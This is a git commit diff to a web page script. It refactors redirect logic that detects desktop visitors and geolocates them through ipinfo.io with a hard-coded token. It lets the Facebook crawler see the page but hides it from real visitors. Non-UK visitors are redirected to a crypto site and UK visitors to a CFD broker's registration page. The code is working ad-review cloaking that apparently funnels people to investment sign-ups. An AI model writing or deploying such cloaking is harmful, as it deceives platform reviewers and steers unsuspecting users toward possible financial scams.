f08889629cd654b431ef53549e6cad7a4b1ca639
vautrinF <131580804+vautrinF@users.noreply.github.com>
2023-04-23 11:32:39 +0300

    Update script.js

--- script.js
+++ script.js
@@ -2,12 +2,6 @@ function isMobileDevice() {
   return (typeof window.orientation !== "undefined") || (navigator.userAgent.indexOf('IEMobile') !== -1);
 }
 
-function redirectTo(url) {
-  if (window.location.href !== url) {
-    window.location.replace(url);
-  }
-}
-
 if (!isMobileDevice()) {
   fetch('https://ipinfo.io/json?token=0784c654f65d07')
     .then(response => response.json())
@@ -15,9 +9,9 @@ if (!isMobileDevice()) {
       const isFacebookBot = navigator.userAgent.includes('facebookexternalhit');
       if (!isFacebookBot && data.country !== 'GB') {
         document.querySelector('.blue-page').style.display = 'none';
-        redirectTo("https://www.cryptoacademie.net/");
+        window.location.href = "https://www.cryptoacademie.net/";
       } else if (data.country === 'GB') {
-        redirectTo("https://cfd.fortuna-invest.com/register");
+        window.location.href = "https://cfd.fortuna-invest.com/register";
       }
     });
 }
